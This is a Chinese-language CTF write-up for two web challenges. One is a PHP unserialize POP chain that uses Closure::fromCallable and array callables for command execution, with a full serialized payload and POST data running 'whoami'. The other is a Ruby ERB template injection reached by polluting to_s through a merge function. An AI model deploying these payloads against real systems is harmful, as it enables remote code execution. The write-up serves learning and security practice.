这个php的pop链很简单，主要是如何利用call_user_func($a, $b)($c)($d);进行rce

$a必须要是内置类或者内置类里面的静态方法，$b是删除了$a的POST数组，$c 和 $d 可以任意控制

经过查找可以知道Closure里面的fromCallable可以调用函数执行命令

```
Closure::fromCallable("system")("whoami");
```

这样虽然会报错，但也可以执行命令

```
call_user_func('Closure::fromCallable', "system")('whoami')();
```

但是因为这里的$b是一个$_POST数组，这样传参上去无法执行，因为数组直接当做字符串只会被当做Array，一直报错

---

这里需要用到php的特性，用数组来调用方法。

利用了 PHP 的可调用值（callable）特性。PHP 允许数组作为可调用对象，格式为 [类名或对象, 方法名]。

例如：

```
<?php
$b[0] = 'Closure';
$b[1] = 'fromCallable';
$b('system')('whoami');

// 能够成功执行
```

所以这里可以使用嵌套再次调用`Closure::fromCallable`

```
call_user_func('Closure::fromCallable', "Closure::fromCallable")('system')('whoami');
```

所以最终构造的payload就是这样的

```
?un=O:7:"class_C":1:{s:1:"c";O:7:"class_A":2:{s:1:"s";O:7:"class_B":2:{s:1:"c";s:6:"system";s:1:"d";s:6:"whoami";}s:1:"a";s:1:"x";}

POST:
a=Closure::fromCallable&0=Closure&1=fromCallable
```

前置知识：

#### ERB

ERB是Ruby自带的的内置模版引擎

就是一种模版注入，和jinjia2差不多

格式：

```
<% Ruby代码 %>

<%= Ruby代码 %>
```

可以通过注入来进行命令执行

例如：

```
require 'erb'

template = "Hello, <%= 7*7 %>!"
result = ERB.new(template).result(binding)
```

会输出49

---

这题类似于js原型链污染，可以看到有merge函数，通过/set_age路由可以污染@to_s变量的值，我们可以通过merge函数修改@to_s变量的值为erb模版注入的代码

在 `merge` 函数中，关键的两行代码实现了动态属性添加：

ruby

```
current_obj.singleton_class.attr_accessor(key)  # 动态创建 getter/setter 方法
current_obj.instance_variable_set("@#{key}", value)  # 设置实例变量
```

例如，当传入 `{ "to_s" => "模版注入代码" }` 时：

- 调用 `attr_accessor(:to_s)`，为对象动态生成 `to_s` 和 `to_s=` 方法。
- 调用 `instance_variable_set("@to_s", "true")`，设置实例变量 `@to_s` 的值为 `"模版注入代码"`。

然后在/view路由下后会调用`is_admin=user.is_admin?().to_s`，就会返回恶意代码并且赋值给is_admin，最后再进行模版渲染`ERB::new("<h1>Hello,oSthinggg!#{op_age} man!you #{is_admin} </h1>").result`从而执行命令
